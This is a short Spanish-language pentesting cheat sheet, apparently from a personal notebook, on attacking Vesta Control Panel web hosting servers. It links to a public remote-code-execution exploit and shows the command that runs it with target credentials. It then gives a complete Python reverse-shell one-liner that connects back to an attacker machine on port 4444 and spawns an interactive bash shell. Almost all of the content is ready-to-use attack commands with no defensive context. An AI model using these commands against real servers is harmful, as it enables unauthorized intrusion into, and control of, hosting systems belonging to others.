# Vesta 

Tags: #Vesta 

Vesta Control Panel (VestaCP), un panel web para administrar servicios de hosting en Linux.
## RCE
* [Vesta Poc - RCE](https://github.com/CSpanias/vesta-rce-exploit)
```bash 
❯ python3 vesta-rce-exploit.py https://IP_server:8083 <user> <Password> 

NOTA:
	- Se tendrá un shell limitada 
```

```bash 
# Dentro de la shell limitada hacer lo siguiente 
❯ which python3   # Mirar si python3 esta instalado 
❯ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_Kali",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```